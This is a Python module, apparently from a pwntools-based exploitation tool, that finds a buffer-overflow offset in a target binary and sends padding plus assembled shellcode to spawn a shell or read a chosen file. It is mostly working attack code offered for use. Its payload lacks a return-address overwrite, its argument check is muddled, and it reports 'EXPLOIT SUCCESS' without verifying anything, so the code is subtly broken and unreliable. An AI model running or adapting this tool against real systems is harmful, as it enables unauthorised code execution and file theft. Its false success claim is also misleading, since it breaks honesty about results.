import argparse, sys, pathlib, utils, pwn, os, contextlib
from logger import Logger
from binary import Binary

pwn.context.log_level = 'error'

class Shellcode:
    command = 'shellcode'

    def __init__(self):
        parser = argparse.ArgumentParser(
            description='Generate executable code and send it'
        )

        parser.add_argument('-s', '--shell', help='Get a shell', action='store_true')
        parser.add_argument('-r', '--read', type=str, help='Read specified file', metavar='file')
        parser.add_argument('binary', nargs='?', type=pathlib.Path, help='Binary to exploit')

        sysargs = sys.argv[2:]

        if len(sysargs):
            args = parser.parse_args(sys.argv[2:])

            if not args.binary and (not args.read or not args.shell):
                Logger.error(f'You have to specify a {Logger.custom("binary", color="red", style="bold")} and a {Logger.custom("file to read", color="red", style="bold")} or {Logger.custom("shell option", color="red", style="bold")} to exploit\n')
                parser.print_help()
                exit(1)

            self.shell = args.shell
            self.read = args.read

            self.binary = Binary(args.binary)
            self.main()

        else:
            parser.print_help()

    # main {{{
    def main(self):
        Logger.info('Starting exploitation\n')

        overflow_offset = self.binary.get_overflow_offset()

        if overflow_offset == -1:
            Logger.error(f'No overflow offset found ¯\_(ツ)_/¯')
            exit(1)

        Logger.success(f'Overflow offset found: {overflow_offset}')

        if self.shell:
            self.shellcode = pwn.asm(getattr(pwn.shellcraft, self.binary.ELF.arch).sh(), arch=self.binary.ELF.arch)

        elif self.read:
            self.shellcode = pwn.asm(getattr(pwn.shellcraft, self.binary.ELF.arch).cat(self.read), arch=self.binary.ELF.arch)

        process = pwn.process(self.binary.path)
        process.sendline(b'A'* overflow_offset + self.shellcode)
        Logger.success('EXPLOIT SUCCESS\n')

        process.interactive()

        exit(0)
    # }}}
